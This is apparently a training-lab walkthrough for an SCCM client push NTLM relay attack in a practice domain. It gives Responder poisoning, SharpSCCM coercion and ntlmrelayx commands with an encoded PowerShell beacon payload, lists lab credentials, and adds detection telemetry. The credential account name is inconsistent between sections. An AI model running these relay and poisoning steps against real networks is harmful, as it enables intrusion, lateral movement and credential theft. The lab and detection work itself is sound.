# WT#036 — SCCM Client Push Relay

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | mbr02 (192.168.77.23) |
| **Domain** | range.local |
| **Starting Credential** | NAA credentials from WT#034 (range\sccm-naa : N@A_s3rv1c3!) |
| **Tools Required** | impacket-ntlmrelayx, SharpSCCM, Responder |
| **Certifications** | WKL (WasteHelloKitty — OADOC) |
| **MITRE ATT&CK** | T1557.001 (LLMNR/NBT-NS Poisoning and Relay), T1212 (Exploitation for Credential Access) |
| **Difficulty** | Hard |

## Prerequisites
- NAA credentials from WT#034 (range\svc_naa : N@A_s3rv1c3!)
- SCCM Auto Client Push enabled on mbr02 — verifiable via `10-sccm-verify.yml`
- Responder running on attacker machine in range.local subnet
- SMB signing disabled on target endpoints (default CADRE)

## Attack Steps

### 1. Set up NTLM relay with impacket

```bash
# On attacker Kali VM
impacket-ntlmrelayx -tf targets.txt -smb2support -c "powershell -enc <BASE64_BEACON>"
```

Where `targets.txt` contains:
```
192.168.77.23
192.168.77.22
192.168.77.10
```

### 2. Trigger SCCM client push

```powershell
# On the SCCM site server (if accessible)
# Or poison traffic to relay towards SCCM
SharpSCCM.exe client-push -s sccm-range.range.local -t 192.168.77.23
```

### 3. Enable SMB relay target

```bash
# Responder poisoning to capture auth from SCCM server
responder -I eth0 -rdwv

# Relay captured hashes to target machines
impacket-ntlmrelayx -tf targets.txt -smb2support -socks
```

### 4. Capture relayed shell

```powershell
# Relayed NTLM auth triggers payload execution on target
# Interactive session established via SMB exec
```

## Post-Exploitation Chain
```
NAA Credentials (WT#034)
  └──> SCCM Client Push Relay (WT#036)
       ├──> NTLM relay from SCCM server → Target endpoints
       │    └──> Remote code execution on relay target
       │         ├──> Lateral movement
       │         └──> Credential harvesting
       └──> LLMNR/NBT-NS poisoning → Captured hashes
            └──> Offline cracking → Additional credentials
```

## Telemetry Verification
**On SCCM site server:**
- **CCM.log**: `C:\Program Files\Microsoft Configuration Manager\Logs\ccm.log`
- **SMSClientPush.log**: Client push initiation logs
- **Event ID 4663** (SMS Client Push helper access)
- SMB connections to target machines on TCP 445

**On target endpoint (mbr02):**
- **Event ID 4624** (Logon Type 3 — SMB relay from SCCM server)
- **Event ID 4688** (Process creation via relayed execution)
- SMB incoming connections on TCP 445 from SCCM server IP

**Detection Rules:**
- SMB relay attacks characterized by Logon Type 3 with NTLMv2 authentication
- SharpSCCM.exe `client-push` command on SCCM management tools
- Responder poisoning detected via LLMNR/NBT-NS traffic analysis
- Multiple SMB authentication attempts from a single source to multiple targets in short succession

## Status
**CONFIGURED** — SCCM Auto Client Push enabled on mbr02. NAA credentials (`range\svc_naa`) have admin rights on range.local domain-joined machines. Requires attacker-controlled relay to intercept client push NTLM authentication.
